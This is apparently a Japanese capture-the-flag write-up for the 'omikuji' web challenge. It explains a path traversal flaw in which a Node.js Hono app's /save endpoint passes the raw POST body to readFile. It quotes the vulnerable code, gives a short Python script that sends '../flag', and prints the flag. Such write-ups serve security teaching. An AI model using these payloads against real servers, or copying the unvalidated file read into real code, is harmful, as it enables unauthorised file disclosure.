# omikuji

| 項目 | 値 |
|---|---|
| **大会** | AlpacaHack / DailyAlpacaHack ([Mirror] TSG LIVE! CTF) |
| **ジャンル** | Web |
| **難易度** | Medium |
| **フラグ** | `TSGLIVE{1_knew_at_f1rst_g1ance_that_1t_was_so_0rdin4ry_path_traversal}` |
| **日付** | 2026-03-01 |

## 概要

おみくじアプリ。Node.js (Hono) + nginx 構成。おみくじを引いて結果を保存できる。フラグは `/flag` にある。

## 脆弱性

**Path Traversal**

`/save` エンドポイントの POST body がそのまま `readFile` のパスに使われる：

```javascript
async function getResultContent(type) {
  return await readFile(`${import.meta.dirname}/${type}`, 'utf-8')  // 未検証！
}

app.post('/save', async c => {
  const type = await c.req.text()      // ← ユーザー入力がそのまま
  const content = await getResultContent(type)  // ← Path Traversal
  // ... content が HTML に埋め込まれて保存される
})
```

`import.meta.dirname` = `/app` なので、`../flag` を送ると `/app/../flag` = `/flag` が読み取れる。

## 解法

```python
r = requests.post(f'{BASE}/save', data='../flag')
location = r.json()['location']
r2 = requests.get(f'{BASE}{location}')
# → HTML の <pre> 内にフラグが出力される
```

## 学んだこと

- Node.js の `readFile` にユーザー入力を直接渡す → Path Traversal
- `import.meta.dirname` は実行ファイルのディレクトリパス（`__dirname` の ESM 版）
- Web 問題では POST body もパストラバーサルのベクターになる
